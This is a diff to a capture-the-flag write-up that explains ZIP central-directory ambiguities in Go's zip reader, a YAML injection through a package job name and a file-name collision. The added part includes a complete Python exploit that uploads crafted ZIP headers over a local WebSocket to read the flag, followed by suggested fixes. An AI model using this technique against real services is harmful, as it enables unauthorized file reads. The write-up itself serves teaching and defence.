@@ -93,27 +93,18 @@ The general Zip structure looks like this:<br>
 
 A directory of all files, called _Central Directory_ (CD) is placed at the end (yes you read that right) of a ZIP file. This identifies what files are in the Zip and where there are located (it doesn't literally need to be at the end, but we'll come back to this later).<br>
 The CD consists of a _CD File Header_ for each file in the archive, that contains multiple fields, among them:
-- _Member Name_ along with _Member Name Length_: Uncompressed, arbitrary data of max legnth of 2^16 bytes
-- _Compression Method_: may be uncompressed (`0`)
-- _CheckSum_: if this is `0`, the checksum is ignored
-- _Member Size_
-- _Extra Field Length_: extra data after the _Member Name_, max length of 2^16 bytes
-- _Offset_
-However, this is not the offset of the file content itself: the content is preceded by a _Local File Header_, which simply repeats most of the details already present in the CD file header.
+- `file-name-len` and `file-name`: Name of a member: *Uncompressed and arbitrary*, max 2^16 bytes 
+- `compression`: May be no compression (`0`)
+- `crc-32`: if this is `0`, the checksum is ignored
+- `compressed-size`
+- `extra-filed-length`: extra data after the `file-name`, max 2^16 bytes
+- `offset`: This is not the offset of the file content itself: the content is preceded by a _Local File Header_, which simply repeats most of the details already present in the central directory.
 
-
-As mentioned above, the Zip archive does not need to end in the CD. The standard allows for a _File comment_ of length up to 65535 bytes after the CD, which can contain almost arbitrary data.
-
-<TODO>
-Look at other images if they fit the style better.
-Include images or details as needed (CD, LFH).
-Important to mention:
-- Tricks used: pushing junk data into large filename of first zip.
-</TODO>
+As mentioned above, the Zip archive does not need to end in the CD. The standard allows for a _File comment_ of length up to 65535 bytes after the CD, which can contain arbitrary data.
 
 # Zip! Y u so nasty??? 
-The keen reader might have observed that the format allows for some nasty ambiguities: Some header fields, like `cksum` and `compression` are in the directory header AND member header, so which one takes precedence? 
-We checked the go implementation and it seems like it will always use the value in the directory header for
+The keen reader might have observed that the format allows for some nasty ambiguities: Some header fields, like `crc-32` and `compression` are in the directory header AND member header, so which one takes precedence? 
+We checked the go implementation. It seems like it will always use the value in the directory header for
 all fields, except `extra-field-length`. This field is also a key part of our exploit: By setting the value very 
 high, we can make the go zip reader read "below" the contents of our actual zip file -> i.e. the contents of the tar archive -> the flag!
 
@@ -125,7 +116,7 @@ encounters anything it doesn't like, for example invalid checksums or broken dir
 But truth be told, we do control one of the header fields: The member name! After a lot of head scratching our refined 
 exploit plan looks like this:
 
-1. Create a large `notflogs.tar` with the flag inside using our InYection
+1. Create a large `manyflgs.tar` with the flag inside using our InYection
 2. Write a smaller `small.zip` into the tar, so we have a zip directory header
 3. Write an even smaller `tiny.zip` into the tar, with a member name that:
    - Contains a valid member header with a large `extra-field-lengt` to make go zip reader jump down and read the 
@@ -138,9 +129,218 @@ exploit plan looks like this:
 ![DefCon ctf Web Challenges](./assets/web-challenge-meme.jpg)
 
 
+After we generate the tar and upload `small.zip`, we see a directory header in `manyflgs.tar` that looks like this. The long streak of `D`s is our chosen member name.
+![small-zip-directory](./assets/small-zip-directory.png).
+
+After uploading `tiny.zip` we see its directory header in the file, which looks like below. Notice that some `D`s where overwritten.
+
+![tiny-zip-directory](./assets/tiny-zip-directory.png).
+
+Now remember that the directory header is at the **end** of a zip file? That also means that a zip reader will search for the directory header end-to-start!
+So the file will actually be interpreted like below. (No data changed, only the coloring.)
+
+![small-zip-directory-overwritten](./assets/small-zip-directory-overwritten.png).
+
+And now we can just `download` at an arbitrary offset below our local header, by setting the "extra field length" and size of our member. -> We get the flag!
+
+# Exploit: 
+```python
+import base64
+import re
+import urllib
+from zipfile import ZipFile
+
+from websocket import create_connection
+
+ws = create_connection("ws://localhost:5555/ws/")
 
 
+def cmd(cmd, do_rcv: bool = True):
+    ws.send(cmd)
+    if do_rcv:
+        return ws.recv()
+    else:
+        return
 
 
+def upload(name, data):
+    data = base64.b64encode(data).decode()
+    r = cmd(f"upload {name} {data}")
+    l = r.strip().split(" ")
+    assert l[0] == "upload-success", r
 
 
+def download(name):
+    r = cmd(f"download {name}")
+    l = r.strip().split(" ")
+    assert l[0] == "file", r
+
+    return base64.b64decode(l[2])
+
+
+def create_manyflgs_zip():
+    name = '''manyflgs"
+      artifacts:
+        - "flag.txt"
+        - "flag.txt" 
+    - use: archive
+      name: "'''
+
+    cmd("job package " + urllib.parse.quote(name))
+
+
+def upload_small_zip():
+    filename_len = 11  # gives us nicely aligned local headers
+
+    with ZipFile("small.zip", mode="w") as zip_file:
+        with zip_file.open("D" * 100, mode="w") as mem:
+            mem.write(b"A")
+
+        for i in range(3):
+            with zip_file.open(str(i) * filename_len, mode="w") as mem:
+                mem.write(b"B")
+
+    with open("small.zip", "rb") as f:
+        upload("manyflgs.tar.zip", f.read())
+
+
+def upload_tiny_zip():
+    # Value eyballed with trial,error and hex viewer
+    filename_len = 145
+    # Using a placeholder string as file name, because zipfile doesn't like bytes as member names
+    # Replaced with bytes below
+    placeholder = b"{{" + b"A" * (filename_len - 4) + b"}}"
+
+    with ZipFile("tiny.zip", mode="w") as zip_file:
+        with zip_file.open(placeholder.decode(), mode="w") as mem:
+            mem.write(b"ABC")
+
+    # local file header, most fields are irrelevant (set to zero)
+    local_file_header = bytes(
+        [
+            0x50,
+            0x4B,
+            0x03,
+            0x04,  # magic bytes
+            0x00,
+            0x00,  # version
+            0x00,
+            0x00,  # flags
+            0x00,
+            0x00,  # compression
+            0x00,
+            0x00,  # mod time
+            0x00,
+            0x00,  # mod date
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # checksum
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # compressed size
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # uncompressed size
+            0x00,
+            0x00,  # name length
+            0x00,
+            0x00,  # extra field length
+            0x00,
+            0x00,  # file name
+        ]
+    )
+
+    # central directory header, most fields are irrelevant (set to zero)
+    central_directory_header = bytes(
+        [
+            0x50,
+            0x4B,
+            0x01,
+            0x02,  # magic bytes
+            0x00,
+            0x00,  # version
+            0x00,
+            0x00,  # version needed
+            0x00,
+            0x00,  # flags
+            0x00,
+            0x00,  # compression
+            0x00,
+            0x00,  # mod time
+            0x00,
+            0x00,  # mod date
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # checksum
+            0x00,
+            0x07,
+            0x00,
+            0x00,  # compressed size
+            0x00,
+            0x07,
+            0x00,
+            0x00,  # uncompressed size
+            0x02,
+            0x00,  # name length
+            0x62,
+            0x00,  # extra field len
+            0x00,
+            0x00,  # file comment len
+            0x00,
+            0x00,  # disk number start
+            0x00,
+            0x00,  # internal attributes
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # external attributes
+            0x39,
+            0x01,
+            0x00,
+            0x00,  # offset of local header
+        ]
+    )
+
+    payload = local_file_header + central_directory_header
+    padding_len = len(placeholder) - len(payload)
+
+    # Replace member names with our payload
+    with open("tiny.zip", "rb") as f:
+        contents = f.read()
+
+    for result in re.finditer(b"{{A*}}", contents):
+        start, stop = result.span()
+        assert len(payload) + padding_len == stop - start
+        contents = contents[: start + padding_len] + payload + contents[stop:]
+
+    upload("manyflgs.tar.zip", contents)
+
+
+if __name__ == "__main__":
+    create_manyflgs_zip()
+    input("manyflgs.tar created, hit enter to continue...")
+    upload_small_zip()
+    input("small.zip uploaded, hit enter to continue...")
+    upload_tiny_zip()
+    print("tiny.zip uploaded. Downloading flag:")
+
+    # Member name is "PK" because those are the magic bytes for a directory header entry
+    recv_zip = download("manyflgs.tar/PK")
+    print(re.findall(rb"flug\{.*?\}", recv_zip)[0].decode())
+
+```
+
+# Fix(es):
+
+As usual, the yaml injection could be fixed by properly sanitizing/validating user inputs. While theoretically 
+linux allows lots of unusual characters in file names, this use-case requires that at least quotes and newlines are 
+escaped. An allow-list of characters might be even more adequate.
+
+`compress_files` overwriting files is obvious bug that should be fixed by either completely replacing existing files
+or aborting if the file already exists. 
+
+To avoid the collision of file-names that allowed us to target `manyflgs.tar` with `compress_files`, file-name handling should be implemented more prudently. It currently overlooks at least one corner case: files with multiple "extensions". One simple fix might be using separate directories for `zip` and `tar` files.
